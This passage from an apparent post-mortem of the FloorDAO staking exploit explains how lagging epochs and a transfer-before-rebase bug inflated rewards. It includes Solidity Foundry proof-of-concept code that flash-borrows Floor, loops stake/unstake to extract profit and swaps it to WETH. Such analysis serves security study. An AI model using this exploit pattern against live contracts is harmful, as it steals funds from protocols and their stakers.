+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">    </span><span class="p">...</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>The problem actually lies within the <code>stake</code> function, which first transfers the Floor tokens the user wants to stake to the staking contract and then calls the <code>rebase</code> function. This causes the <code>balance</code> calculated during rebase to include the amount that users have staked, resulting in data discrepancies.</p>
+<p><img alt="Image" src="../../image/230905_FloorDAO.assets/5112.png" /></p>
+<p>Looking at the <a href="https://explorer.phalcon.xyz/tx/eth/0x13d8ee0531636b455fc8105e5f8e2d11c26901cf9db04156c9f32801d976889a">first rebase transaction</a>, which directly called the <code>rebase</code> function to complete the rebase, this was the first epoch, so the <code>profit</code> was 0, and no tokens were issued.</p>
+<p><img alt="Image" src="../../image/230905_FloorDAO.assets/5244.png" /></p>
+<p>Subsequently, the <code>distribute</code> was called, minting new Floor tokens (with a rate of 1000). Therefore, the subsequent calculation showed that the Floor reserves were higher than the circulating sFloor tokens, and the surplus became the rewards for the next epoch (<code>distribute/profit</code>) (1000), clearly the reserve of Floor tokens and circulation quantity of sFloor before mint are consistent.</p>
+<p>This process is correct because the rebase was not completed through the <code>stake</code> function.</p>
+<p><img alt="Image" src="../../image/230905_FloorDAO.assets/0328.png" /></p>
+<p>However, the <a href="https://explorer.phalcon.xyz/tx/eth/0x807e9f354236504f913048005e3661d342bd23be3532466bc6a999e1fcb5cce1">second rebase transaction</a> was executed through the <code>stake</code> function, leading to a problem. In the <code>stake</code> function, it first called the <code>rebase</code> function of sFloor to distribute rewards from the previous epoch, and then, based on the growth rate, minted approximately 1020 new Floor tokens. Normally, the <code>balance-staked</code> should be approximately 1020. Floor reserves should only exceed the circulating sFloor tokens after minting new Floor tokens, and then it should be distributed in the next rebase, returning to balance. In other words, the <code>profit</code> during each rebase should be the Floor tokens minted in the previous rebase. At each epoch, the calculated Floor reserve should be higher than the sFloor's circulating supply, and the surplus should be distributed to the stakers in the next epoch.</p>
+<p><img alt="Image" src="../../image/230905_FloorDAO.assets/1423.png" /></p>
+<p>However, due to the incorrect <code>transfer-&gt;rebase</code> order mentioned earlier, when calculating the rewards for the next epoch, the <code>balance</code> was augmented by the user's staked amount (which was 129 in this case). This resulted in an incorrect <code>profit</code> of 1149 (1020+129). While only 1020 Floor tokens were minted, the next epoch was set to distribute 1149 sFloor tokens, causing all stakers to receive more tokens after the next rebase than they should have.</p>
+<p>At this point, the circulating sFloor tokens exceeded the Floor reserves. If everyone tried to convert their sFloor to Floor, it wouldn't be possible. Since the new minted Floor tokens would only be distributed in the next epoch, the balance might suffice initially, but over time, the discrepancies between <code>balance</code> and <code>staked</code> would grow. Essentially, this created additional rewards out of thin air but was effectively overdrawing the staking contract's Floor token balance. This meant that the current distribution would be greater than the actual distribution/minted amount, and it could potentially lead to a situation where newly generated Floor tokens couldn't catch up with the circulating sFloor tokens for a long time (if directly calling <code>rebase</code>). However, if the incorrect <code>rebase</code> method (<code>stake</code> function) continued to be used, a significant amount of tokens could be injected to perpetuate the incorrect distribution/overdraft for profit.</p>
+<hr />
+<p>This attack resulted from the combination of the two aforementioned reasons: the lagging epoch allowed the attacker to perform multiple rebases in a single transaction, and the bug in the <code>stake</code> function, which involved an incorrect <code>transfer-&gt;rebase</code> order, caused a balance calculation discrepancy. This allowed the attacker to stake a large number of Floor tokens to inflate the next epoch's <code>profit</code> and thereby gain more profit.</p>
+<p>Other users who had staked before the attack could also profit (since a large number of sFloor tokens were distributed). However, the attacker immediately sold the Floor tokens after the attack, causing the Floor price to drop, indirectly causing losses to other Floor stakers.</p>
+<p>To address the lagging epoch issue, it would be advisable to set up bots to perform real-time rebases and update the epoch. Regarding the bug in the <code>stake</code> function, the correct approach should be to first call <code>rebase</code>, calculate the <code>profit</code> for the next epoch, and then transfer the Floor tokens.</p>
+<h2 id="exploit">Exploit</h2>
+<h3 id="reproduction">Reproduction</h3>
+<p>Based on the above analysis, combined with the AttackTx, the exploit can be reproduced as follows:</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testExploit</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">18068772</span><span class="p">;</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">    </span><span class="c1">// uint attackBlockNumber = 17068772;</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">    </span><span class="p">(,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">number</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">end</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>staking<span class="p">.</span>epoch<span class="p">();</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">    </span>emit<span class="w"> </span>log_named_uint<span class="p">(</span><span class="s2">&quot;Epoch number&quot;</span><span class="p">,</span><span class="w"> </span>number<span class="p">);</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">    </span>emit<span class="w"> </span>log_named_uint<span class="p">(</span><span class="s2">&quot;Epoch end&quot;</span><span class="p">,</span><span class="w"> </span>end<span class="p">);</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;floor balanceOf StakingPool&quot;</span><span class="p">,</span><span class="w"> </span>floor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>staking<span class="p">)),</span><span class="w"> </span>floor<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;floor balanceOf Pair&quot;</span><span class="p">,</span><span class="w"> </span>floor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>floor_weth<span class="p">)),</span><span class="w"> </span>floor<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;sFloor sirculatingSupply&quot;</span><span class="p">,</span><span class="w"> </span>sFloor<span class="p">.</span>circulatingSupply<span class="p">(),</span><span class="w"> </span>sFloor<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="w">    </span>flashAmount<span class="w"> </span><span class="o">=</span><span class="w"> </span>floor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>floor_weth<span class="p">))</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="w">    </span>floor_weth<span class="p">.</span>flash<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>flashAmount<span class="p">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">profitAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>floor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;floor balance after exploit&quot;</span><span class="p">,</span><span class="w"> </span>profitAmount<span class="p">,</span><span class="w"> </span>floor<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="w">    </span>floor_weth<span class="p">.</span>swap<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="kt">false</span><span class="p">,</span><span class="w"> </span><span class="kt">int256</span><span class="p">(</span>profitAmount<span class="p">),</span><span class="w"> </span><span class="kt">uint160</span><span class="p">(</span><span class="mh">0xfFfd8963EFd1fC6A506488495d951d5263988d25</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;weth balance after swap&quot;</span><span class="p">,</span><span class="w"> </span>weth<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>weth<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="p">}</span>
+</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>
+</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="kt">function</span><span class="w"> </span><span class="nv">uniswapV3FlashCallback</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="cm">/*fee0*/</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">fee1</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
+</span><span id="__span-10-23"><a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a><span class="w">    </span><span class="kt">while</span><span class="p">(</span>i<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="m m-Decimal">17</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-10-24"><a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a><span class="w">        </span><span class="kt">uint</span><span class="w"> </span><span class="nv">balanceAttacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>floor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-10-25"><a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a><span class="w">        </span><span class="kt">uint</span><span class="w"> </span><span class="nv">balanceStaking</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>floor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>staking<span class="p">));</span>
+</span><span id="__span-10-26"><a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a><span class="w">        </span><span class="kt">uint</span><span class="w"> </span><span class="nv">circulatingSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sFloor<span class="p">.</span>circulatingSupply<span class="p">();</span>
+</span><span id="__span-10-27"><a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>balanceAttacker<span class="w"> </span><span class="o">+</span><span class="w"> </span>balanceStaking<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>circulatingSupply<span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// will produce profit in next epoch</span>
+</span><span id="__span-10-28"><a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a><span class="w">            </span>floor<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>staking<span class="p">),</span><span class="w"> </span>balanceAttacker<span class="p">);</span>
+</span><span id="__span-10-29"><a id="__codelineno-10-29" name="__codelineno-10-29" href="#__codelineno-10-29"></a><span class="w">            </span>staking<span class="p">.</span>stake<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>balanceAttacker<span class="p">,</span><span class="w"> </span><span class="kt">false</span><span class="p">,</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w"> </span><span class="c1">// get gFloor</span>
+</span><span id="__span-10-30"><a id="__codelineno-10-30" name="__codelineno-10-30" href="#__codelineno-10-30"></a><span class="w">            </span><span class="kt">uint</span><span class="w"> </span><span class="nv">gFloorBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>gFloor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-10-31"><a id="__codelineno-10-31" name="__codelineno-10-31" href="#__codelineno-10-31"></a><span class="w">            </span>staking<span class="p">.</span>unstake<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>gFloorBalance<span class="p">,</span><span class="w"> </span><span class="kt">true</span><span class="p">,</span><span class="w"> </span><span class="kt">false</span><span class="p">);</span>
+</span><span id="__span-10-32"><a id="__codelineno-10-32" name="__codelineno-10-32" href="#__codelineno-10-32"></a><span class="w">            </span>i<span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
+</span><span id="__span-10-33"><a id="__codelineno-10-33" name="__codelineno-10-33" href="#__codelineno-10-33"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-10-34"><a id="__codelineno-10-34" name="__codelineno-10-34" href="#__codelineno-10-34"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-10-35"><a id="__codelineno-10-35" name="__codelineno-10-35" href="#__codelineno-10-35"></a><span class="w">    </span>floor<span class="p">.</span>transfer<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>flashAmount<span class="w"> </span><span class="o">+</span><span class="w"> </span>fee1<span class="p">);</span>
+</span><span id="__span-10-36"><a id="__codelineno-10-36" name="__codelineno-10-36" href="#__codelineno-10-36"></a><span class="p">}</span>
+</span><span id="__span-10-37"><a id="__codelineno-10-37" name="__codelineno-10-37" href="#__codelineno-10-37"></a>
+</span><span id="__span-10-38"><a id="__codelineno-10-38" name="__codelineno-10-38" href="#__codelineno-10-38"></a><span class="kt">function</span><span class="w"> </span><span class="nv">uniswapV3SwapCallback</span><span class="p">(</span><span class="kt">int256</span><span class="w"> </span><span class="cm">/*amount0Delta*/</span><span class="p">,</span><span class="w"> </span><span class="kt">int256</span><span class="w"> </span><span class="nv">amount1Delta</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span><span class="cm">/*data*/</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-10-39"><a id="__codelineno-10-39" name="__codelineno-10-39" href="#__codelineno-10-39"></a><span class="w">    </span><span class="kt">int256</span><span class="w"> </span><span class="nv">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>amount1Delta<span class="p">;</span>
+</span><span id="__span-10-40"><a id="__codelineno-10-40" name="__codelineno-10-40" href="#__codelineno-10-40"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>amount<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-10-41"><a id="__codelineno-10-41" name="__codelineno-10-41" href="#__codelineno-10-41"></a><span class="w">        </span>amount<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>amount<span class="p">;</span>
+</span><span id="__span-10-42"><a id="__codelineno-10-42" name="__codelineno-10-42" href="#__codelineno-10-42"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-10-43"><a id="__codelineno-10-43" name="__codelineno-10-43" href="#__codelineno-10-43"></a><span class="w">    </span>floor<span class="p">.</span>transfer<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">(</span>amount<span class="p">));</span>
+</span><span id="__span-10-44"><a id="__codelineno-10-44" name="__codelineno-10-44" href="#__codelineno-10-44"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>In the <code>flash</code> callback, the specific attack process is executed. Here, the attacker sets the <code>stake/unstake</code> loop to run 17 times, which can actually be increased to obtain more Floor tokens. However, if too many loops are executed, an error "Treasury: insufficient reserves" will occur during the <code>mint</code> operation.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cm">/**</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="cm">* @notice mint new FLOOR using excess reserves</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="cm">* @param _recipient address</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="cm">* @param _amount uint256</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="cm">*/</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="kt">function</span><span class="w"> </span><span class="nv">mint</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_recipient</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_amount</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>override<span class="w"> </span><span class="p">{</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>permissions<span class="p">[</span>STATUS<span class="p">.</span>REWARDMANAGER<span class="p">][</span><span class="k">msg.sender</span><span class="p">],</span><span class="w"> </span>notApproved<span class="p">);</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>_amount<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span>excessReserves<span class="p">(),</span><span class="w"> </span>insufficientReserves<span class="p">);</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="w">    </span>FLOOR<span class="p">.</span>mint<span class="p">(</span>_recipient<span class="p">,</span><span class="w"> </span>_amount<span class="p">);</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="w">    </span>emit<span class="w"> </span>Minted<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>_recipient<span class="p">,</span><span class="w"> </span>_amount<span class="p">);</span>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>This involves the <code>mint</code> function called in the Treasury contract after the distributor. We won't delve into this here.</p>
+<p>Finally, the attacker removes the flash loan fees and gains approximately 14.6k Floor tokens, which are then exchanged for about 40 WETH.</p>
+<p>For the <code>stake</code> operation, gFloor tokens are chosen, but sFloor tokens can also be chosen, as shown below:</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testsFloor</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">18068772</span><span class="p">;</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">    </span>deal<span class="p">(</span><span class="kt">address</span><span class="p">(</span>floor<span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="err">152</span>_000<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">9</span><span class="p">);</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">balanceAttacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>floor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Initial attacker floor&quot;</span><span class="p">,</span><span class="w"> </span>balanceAttacker<span class="p">,</span><span class="w"> </span>floor<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">    </span>floor<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>staking<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="w">    </span>sFloor<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>staking<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="w">    </span>staking<span class="p">.</span>stake<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>balanceAttacker<span class="p">,</span><span class="w"> </span><span class="kt">true</span><span class="p">,</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w">  </span><span class="c1">// get sFloor</span>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">sFloorBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sFloor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="w">    </span><span class="c1">// uint gFloorBalance = staking.wrap(address(this), sFloorBalance);</span>
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="w">    </span><span class="c1">// staking.unstake(address(this), gFloorBalance, true, false);  // unstake by gFloor</span>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="w">    </span>staking<span class="p">.</span>unstake<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>sFloorBalance<span class="p">,</span><span class="w"> </span><span class="kt">true</span><span class="p">,</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w">  </span><span class="c1">// unstake by sFloor</span>
+</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>
+</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="w">    </span>balanceAttacker<span class="w"> </span><span class="o">=</span><span class="w"> </span>floor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Finally attacker floor&quot;</span><span class="p">,</span><span class="w"> </span>balanceAttacker<span class="p">,</span><span class="w"> </span>floor<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-12-22"><a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Finally attacker sFloor&quot;</span><span class="p">,</span><span class="w"> </span>sFloor<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>sFloor<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-12-23"><a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>However, if sFloor tokens are used for the <code>unstake</code> operation, only the same amount of Floor tokens as previously staked can be withdrawn. The additional tokens remain staked in the contract as sFloor tokens because the increase in tokens occurs during the <code>rebase</code> within the <code>unstake</code> operation. These additional tokens can be withdrawn by using the <code>wrap</code> function to convert sFloor tokens to gFloor tokens. But if sFloor is converted to gFloor using <code>wrap</code>, Floor can be withdrawn entirely. This is because the <code>unstake</code> function recalculates the amount using <code>balanceFrom</code> after the <code>rebase</code> operation.</p>
+<p>Other users can also acquire more Floor tokens after the attack, as demonstrated in the following code:</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testOthers</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">18068772</span><span class="p">;</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
